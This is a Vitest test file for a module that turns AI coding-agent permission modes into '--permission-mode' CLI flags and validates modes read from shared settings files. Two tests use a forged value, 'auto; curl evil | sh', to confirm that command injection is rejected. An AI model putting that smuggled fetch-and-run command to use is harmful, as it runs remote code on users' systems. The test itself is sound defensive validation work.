import { describe, it, expect } from 'vitest'
import {
  hasPermissionMode,
  permissionModeFlag,
  withPermissionMode,
  resolvePermissionMode,
  ALL_PERMISSION_MODES,
  PERMISSION_MODE_LABELS,
  type AgentPermissionMode
} from './config'

describe('hasPermissionMode', () => {
  // claude and grok share the flag SPELLING and the value vocabulary, which is the whole
  // requirement for membership. codex (--ask-for-approval) and gemini (--approval-mode) spell it
  // differently, so they stay out until their own mapping exists.
  it('covers claude and grok, and no one else', () => {
    expect(hasPermissionMode('claude')).toBe(true)
    expect(hasPermissionMode('grok')).toBe(true)
    expect(hasPermissionMode('codex')).toBe(false)
    expect(hasPermissionMode('gemini')).toBe(false)
    expect(hasPermissionMode('custom:abc')).toBe(false)
  })
})

describe('permissionModeFlag', () => {
  // Load-bearing: "ask each time" must reproduce today's bare command exactly, so the
  // setting can always be returned to a known-good state.
  it('returns no flags for manual', () => {
    expect(permissionModeFlag('manual')).toEqual([])
  })

  it('returns the CLI flag pair for every other mode', () => {
    expect(permissionModeFlag('auto')).toEqual(['--permission-mode', 'auto'])
    expect(permissionModeFlag('acceptEdits')).toEqual(['--permission-mode', 'acceptEdits'])
    expect(permissionModeFlag('plan')).toEqual(['--permission-mode', 'plan'])
    expect(permissionModeFlag('bypassPermissions')).toEqual([
      '--permission-mode',
      'bypassPermissions'
    ])
  })

  // AgentPermissionMode is compile-time only: the value is deserialized from hand-editable,
  // git-shared JSON (settings.json / project.json) and interpolated into a shell command line.
  // Validate AT the interpolation site (same rule as SAFE_SESSION_ID) — an unrecognized mode
  // must yield the safe bare command, never a flag carrying an unvalidated value.
  it('rejects a forged mode that never passed through resolvePermissionMode', () => {
    const forged = 'auto; curl evil | sh' as unknown as AgentPermissionMode
    expect(permissionModeFlag(forged)).toEqual([])
    expect(permissionModeFlag('yolo' as unknown as AgentPermissionMode)).toEqual([])
    expect(permissionModeFlag('' as unknown as AgentPermissionMode)).toEqual([])
    expect(permissionModeFlag(undefined as unknown as AgentPermissionMode)).toEqual([])
  })
})

describe('withPermissionMode', () => {
  it('appends the flag for a capable agent', () => {
    expect(withPermissionMode('claude', 'claude', 'auto')).toBe('claude --permission-mode auto')
  })

  it('leaves the command bare in manual mode', () => {
    expect(withPermissionMode('claude', 'claude', 'manual')).toBe('claude')
  })

  it('appends after existing args (Branch resume)', () => {
    expect(withPermissionMode('claude -r abc123', 'claude', 'auto')).toBe(
      'claude -r abc123 --permission-mode auto'
    )
  })

  it('never touches a non-capable agent', () => {
    expect(withPermissionMode('codex', 'codex', 'auto')).toBe('codex')
    expect(withPermissionMode('my-agent', 'custom:x', 'bypassPermissions')).toBe('my-agent')
  })

  it('leaves the command untouched for a forged mode', () => {
    const forged = 'auto; curl evil | sh' as unknown as AgentPermissionMode
    expect(withPermissionMode('claude', 'claude', forged)).toBe('claude')
  })
})

describe('withPermissionMode — grok', () => {
  it('emits the same flag it emits for claude, because grok spells it the same way', () => {
    expect(withPermissionMode('grok', 'grok', 'plan')).toBe('grok --permission-mode plan')
    expect(withPermissionMode('grok', 'grok', 'auto')).toBe('grok --permission-mode auto')
    expect(withPermissionMode('grok', 'grok', 'acceptEdits')).toBe(
      'grok --permission-mode acceptEdits'
    )
    expect(withPermissionMode('grok', 'grok', 'bypassPermissions')).toBe(
      'grok --permission-mode bypassPermissions'
    )
  })

  it("`manual` emits NO flag — which is exactly grok's own `default`", () => {
    expect(withPermissionMode('grok', 'grok', 'manual')).toBe('grok')
  })
})

describe('resolvePermissionMode', () => {
  const settings = { claudePermissionMode: 'auto' as AgentPermissionMode }

  it('falls back to the global when the project has no override', () => {
    expect(resolvePermissionMode({}, settings)).toBe('auto')
    expect(resolvePermissionMode(undefined, settings)).toBe('auto')
  })

  it('lets the project override the global', () => {
    expect(resolvePermissionMode({ defaultPermissionMode: 'plan' }, settings)).toBe('plan')
  })

  it('ignores an unknown persisted value rather than passing it to the CLI', () => {
    const project = { defaultPermissionMode: 'yolo' as unknown as AgentPermissionMode }
    expect(resolvePermissionMode(project, settings)).toBe('auto')
  })

  it('ignores an unknown global value and falls back to auto', () => {
    const bad = { claudePermissionMode: 'yolo' as unknown as AgentPermissionMode }
    expect(resolvePermissionMode({}, bad)).toBe('auto')
  })
})

describe('ALL_PERMISSION_MODES', () => {
  it('holds exactly the five supported modes', () => {
    expect([...ALL_PERMISSION_MODES].sort()).toEqual(
      ['acceptEdits', 'auto', 'bypassPermissions', 'manual', 'plan'].sort()
    )
  })

  // The array is what the settings/project dropdowns render, so a mode without a label would
  // ship a blank <option>. This is the invariant that can actually break (add a mode to the
  // union, forget the label), unlike restating each label literal.
  it('gives every listed mode a non-empty label', () => {
    for (const mode of ALL_PERMISSION_MODES) {
      expect(PERMISSION_MODE_LABELS[mode], `missing label for ${mode}`).toBeTruthy()
    }
  })
})
